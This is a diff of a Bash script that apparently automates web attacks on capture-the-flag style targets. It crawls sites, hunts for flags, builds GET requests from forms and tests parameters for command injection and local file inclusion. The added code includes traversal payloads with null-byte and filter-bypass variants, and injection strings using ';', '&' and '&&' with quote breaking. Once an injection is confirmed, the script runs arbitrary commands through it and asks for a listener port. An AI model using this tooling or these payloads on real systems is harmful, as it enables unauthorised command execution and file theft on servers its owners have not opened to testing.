@@ -4,8 +4,6 @@ declare -A port_version_dict
 declare -A http_service_dict
 declare -A site_map_dict
 
-#set -x
-
 menu() {
     echo "Current Settings:"
     echo " "
@@ -123,7 +121,7 @@ settings() {
             read -p "Target IP: " temp_targetIP
         done
     fi
-    read -p "Local IP: " temp_localIP
+    # read -p "Local IP: " temp_localIP
     read -p "Listener Port: " temp_localPort
     read -p "Scan Port(s): " temp_scanPorts
     read -p "HTTP/S Port(s): " temp_httpPorts
@@ -132,7 +130,8 @@ settings() {
 
     # Assign values only if not empty
     [[ -n "$temp_targetIP" ]] && targetIP="$temp_targetIP"
-    [[ -n "$temp_localIP" ]] && localIP="$temp_localIP"
+    #[[ -n "$temp_localIP" ]] && localIP="$temp_localIP"
+    localIP=$(ip route get $targetIP | awk '{print $7; exit}')
     [[ -n "$temp_localPort" ]] && localPort="$temp_localPort"
     [[ -n "$temp_scanPorts" ]] && scanPorts="$temp_scanPorts"
     [[ -n "$temp_httpPorts" ]] && httpPorts="$temp_httpPorts"
@@ -508,12 +507,12 @@ exploreSite()
                 #echo "Top: $top_level"
                 #echo "Checking list for $new_page"
                 #echo "Test Page: $new_page"
-                if [[ ! " ${pages[@]} " =~ " $new_page " && ! "$new_page" =~ \.css$ && ! "$new_page" =~ \.js$ && ! "$new_page" =~ \.png$ && ! "$new_page" =~ \.jpg$ ]]; then
+                if [[ ! " ${pages[@]} " =~ "$new_page" && ! "$new_page" =~ \.css$ && ! "$new_page" =~ \.js$ && ! "$new_page" =~ \.png$ && ! "$new_page" =~ \.jpg$ && ! "$new_page" =~ \.svg$ ]]; then
                     #echo "$new_page"
                     pages+=("$new_page")
                 fi
                 #echo "Test Top Page: $top_level"
-                if [[ ! " ${pages[@]} " =~ "${top_level}" && ! "$new_page" =~ \.css$ && ! "$new_page" =~ \.js$ && ! "$new_page" =~ \.png$ && ! "$new_page" =~ \.jpg$ ]]; then
+                if [[ ! " ${pages[@]} " =~ "${top_level}" && ! "$new_page" =~ \.css$ && ! "$new_page" =~ \.js$ && ! "$new_page" =~ \.png$ && ! "$new_page" =~ \.jpg$ && ! "$new_page" =~ \.svg$ ]]; then
                     #echo $top_level
                     pages+=("${top_level}")
                 fi
@@ -535,7 +534,6 @@ exploreSite()
 }
 
 webAttack() {
-
     if [[ ${#site_map_dict[@]} -eq 0 ]]; then # if user skipped stage 3
         cleanHTTP=()
         getPortList "$httpPorts" cleanHTTP
@@ -556,21 +554,22 @@ webAttack() {
             response=$(curlCall -s "$targetIP:$port$url")
             if [[ -n "$response" ]]; then
                 vuln="False"
-                searchFlag=$(echo "$response" | grep -oE '{[^}]*\}')
+                searchFlag=$(echo "$response" | grep -oE '{[^}]*}' | awk '!/;/')
                 siteForms=$(echo "$response" | sed -n '/<form/,/<\/form>/p')
                 if [[ -n "$searchFlag" ]]; then
                     echo "Potential Flag Found: $url - $searchFlag"
                 fi
                 if [[ -n "$siteForms" ]]; then 
-                    #echo "Form Found: $url "
-                    siteGETs=$(echo "$siteForms" | sed -n "s/.*name='\([^']*\)'.*/\1/p")
-                    if [[ -n "$siteGETs" && "$url" != *"="* ]]; then
-                        url=$(echo "$url?$siteGETs=holder")
+                    echo "Form Found: $url - $siteForms"
+                    formMethod=$(echo "$siteForms" | sed -n 's/.*method=["'"'"']\([^"'"'"']*\)["'"'"'].*/\1/p') 
+                    if [[ $formMethod = "get" ]]; then
+                        url=$(getRequestURL "$url" "$siteForms")
+                        #echo "$url"
                     fi
                 fi
                 
                 if [[ "$url" == *"="* && $vuln != "True" ]]; then
-
+                    echo "$url"
                     checkVulns "CI"
                     [[ "$vuln" == "True" ]] && break
                     checkVulns "LFI"
@@ -591,7 +590,10 @@ lfi()
     searchWord="version"
     lfi_injections=(
     "$searchFile"
-    "../../../../../..$searchFile")
+    "../../../../../../..$searchFile"
+    "../../../../../../..$searchFile%00"
+    "../../../../../../..$searchFile/."
+    "....//....//....//....//....//....$searchFile")
 
     for injection in "${lfi_injections[@]}"; do
         encoded_injection=$(urlencode "$injection")
@@ -609,13 +611,22 @@ lfi()
 
 
 ci() {
-    #set -x # Debug
+    #set -x
+    #Verbose Set of Commands
     root=$(echo "$1" | cut -d'=' -f1)
     searchWord="The Lightning Thief Strikes Again"
     ci_injections=(
-    "echo \"$searchWord\"" 
+    "echo \"$searchWord\""
+    ";echo \"$searchWord\""
+    "&echo \"$searchWord\"" 
+    "&&echo \"$searchWord\""
     "\";echo \"$searchWord\"\""
-    "';echo \"$searchWord\"'")
+    "';echo \"$searchWord\"'"
+    "\"&echo \"$searchWord\"\""
+    "'&echo \"$searchWord\"'"
+    "\"&&echo \"$searchWord\"\""
+    "'&&echo \"$searchWord\"'")
+
     # Define the injection string
     #injection="\";echo \"$searchWord\"\""
     for injection in "${ci_injections[@]}"; do
@@ -626,7 +637,7 @@ ci() {
 
         # Check if the output contains the search word
         if [[ -n "$output" ]]; then
-            check=$(echo "$output" | grep "$searchWord" | grep -v "echo")
+            check=$(echo "$output" | grep -oP "(?<![\"''])\b$searchWord\b")
             if [[ -n "$check" ]]; then
                 # Return "True" and the payload
                 echo "True ${root}=${injection}"
@@ -634,6 +645,8 @@ ci() {
             fi
         fi
     done
+
+    #Need to Check for Blind Injection (using timeout for windows and ping for linux)
 }
 
 checkVulns()
@@ -688,7 +701,7 @@ createPayload()
                 break
             else
                 if [[ "$2" = "CI" ]]; then
-                    new_command=$(urlencode "$payload_command | xargs")
+                    new_command=$(urlencode "$payload_command | xargs ")
                     new_payload=$(echo "$1" | sed "s/echo \"The Lightning Thief Strikes Again\"/$new_command/")
                     exploit_output=$(curlCall -s "$new_payload" | sed 's/<[^>]*>//g' | sed 's/^[[:space:]]*//' | sed '/^[[:space:]]*$/N;/^\n$/D')
                 elif [[ "$2" = "LFI" ]]; then
@@ -738,6 +751,34 @@ curlCall()
     echo "Failed to get a successful response after $max_retries retries."
     fi
 
+}
+
+getRequestURL()
+{
+    #set -x
+    local url=$1
+    local siteForms=$2
+    getName=$(echo "$siteForms" | sed -n 's/.*name=["'\'']\([^"'\''"]*\)["'\''].*/\1/p')
+    if [[ -n "$getName" && "$url" != *"="* ]]; then
+        #NOT THAT SIMPLE - BUILD THIS THE RIGHT WAY USING  ACTION and NAME
+        action=$(echo "$siteForms" | sed -n 's/.*action=["'"'"']\([^"'"'"']*\)["'"'"'].*/\1/p')
+        if [[ "$action" == "./" || "$action" = "." || "$action" = "" || "$action" = " " || -z "$action" ]]; then
+            url=$(echo "$url?$getName=holder")
+        elif [[ "$url" == */ ]]; then
+            if [[ "$action" == "./$getName" ]]; then
+                url=$(echo "$url$action=holder")
+            else
+                url=$(echo "$url$action?$getName=holder")
+            fi
+        else
+            if [[ "$action" == "./$getName" ]]; then
+                url=$(echo "$url/$action=holder")
+            else
+                url=$(echo "$url/$action?$getName=holder")
+            fi
+        fi
+        echo "$url"
+    fi
 }
 
 echo " "
